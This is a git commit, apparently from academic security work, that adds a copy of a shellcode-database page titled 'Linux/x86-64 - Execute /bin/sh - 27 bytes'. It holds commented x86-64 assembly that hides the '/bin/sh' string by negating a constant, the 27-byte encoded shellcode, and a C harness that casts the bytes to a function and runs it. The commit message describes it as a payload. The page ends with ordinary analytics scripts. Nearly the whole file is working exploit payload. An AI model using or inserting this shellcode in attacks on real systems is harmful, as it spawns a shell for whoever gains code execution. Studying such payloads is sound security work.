15f5b62839e262511438182eec8e204db50bd6de
Nathan Dautenhahn <ndd@cis.upenn.edu>
2019-02-28 15:32:05 -0600

    shellcode used for payload
    Signed-off-by: Nathan Dautenhahn <ndd@cis.upenn.edu>

---
+++ shellcode/shellcode-806.php
@@ -0,0 +1,75 @@
+<html><head><title>Linux/x86-64 - Execute /bin/sh - 27 bytes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta http-equiv="Content-Language" content="en" />
+</head>
+
+
+<pre>
+/*
+ * Execute /bin/sh - 27 bytes
+ * Dad` &lt;3 baboon
+;rdi            0x4005c4 0x4005c4
+;rsi            0x7fffffffdf40   0x7fffffffdf40
+;rdx            0x0      0x0
+;gdb$ x/s $rdi
+;0x4005c4:        &quot;/bin/sh&quot;
+;gdb$ x/s $rsi
+;0x7fffffffdf40:  &quot;\304\005@&quot;
+;gdb$ x/32xb $rsi
+;0x7fffffffdf40: 0xc4    0x05    0x40    0x00    0x00    0x00    0x00    0x00
+;0x7fffffffdf48: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+;0x7fffffffdf50: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+;0x7fffffffdf58: 0x55    0xb4    0xa5    0xf7    0xff    0x7f    0x00    0x00
+;
+;=&gt; 0x7ffff7aeff20 &lt;execve&gt;:     mov    eax,0x3b
+;   0x7ffff7aeff25 &lt;execve+5&gt;:   syscall 
+;
+
+main:
+    ;mov rbx, 0x68732f6e69622f2f
+    ;mov rbx, 0x68732f6e69622fff
+    ;shr rbx, 0x8
+    ;mov rax, 0xdeadbeefcafe1dea
+    ;mov rbx, 0xdeadbeefcafe1dea
+    ;mov rcx, 0xdeadbeefcafe1dea
+    ;mov rdx, 0xdeadbeefcafe1dea
+    xor eax, eax
+    mov rbx, 0xFF978CD091969DD1
+    neg rbx
+    push rbx
+    ;mov rdi, rsp
+    push rsp
+    pop rdi
+    cdq
+    push rdx
+    push rdi
+    ;mov rsi, rsp
+    push rsp
+    pop rsi
+    mov al, 0x3b
+    syscall
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+char code[] = &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;;
+
+int main()
+{
+    printf(&quot;len:%d bytes\n&quot;, strlen(code));
+    (*(void(*)()) code)();
+    return 0;
+}
+
+
+<body><script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
+</script>
+
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-6809519-1");
+pageTracker._trackPageview();
+} catch(err) {}</script></body></html>
